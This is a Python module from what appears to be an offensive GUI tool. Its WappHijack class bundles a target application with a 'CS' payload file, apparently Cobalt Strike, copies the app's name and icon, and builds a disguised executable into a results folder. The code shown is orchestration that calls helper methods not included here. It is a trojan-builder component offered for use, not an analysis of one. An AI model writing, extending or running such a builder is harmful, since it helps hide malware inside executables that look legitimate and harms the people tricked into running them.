from . import GuiControl,WappLogic
from GUIfunction.Pops import Dialogwin,InfoPop
import os



class WappHijack(GuiControl.GuiControl,WappLogic.WappLogic):
    def __init__(self):
        #初始化配置参数
        self.confs={
            'app':'',
            'CS':'',
            'name':'',
        }

    def CreatWapp(self,line,win):
        #开始创造应用劫持文件
        if self.checkNulls():
            self.confs['name']=line.text()
            if self.confs['name']=='':  #使用原本的名称
                self.confs['name']=os.path.basename(self.confs['app'])
            else:
                self.confs['name']=line.text()+'.exe'
            self.writeConfs(self.confs['name'],self.confs['app'],self.confs['CS'])
            self.copyFiles(self.confs['app'],self.confs['CS'])
            self.extractIco(self.confs['app'])
            self.creatExe(self.confs)
            self.deleteFiles(self.confs)
            self.moveFiles(self.confs)
            Dialogwin.show_dialog(win, "目标生成成功!!!请进入results文件夹查看!!!!")



        else:
            self.popup = InfoPop.MessagePopup(message="必要参数空缺!!!☠\n请检查参数是否提供全面！！👾👾")
            self.popup.show()



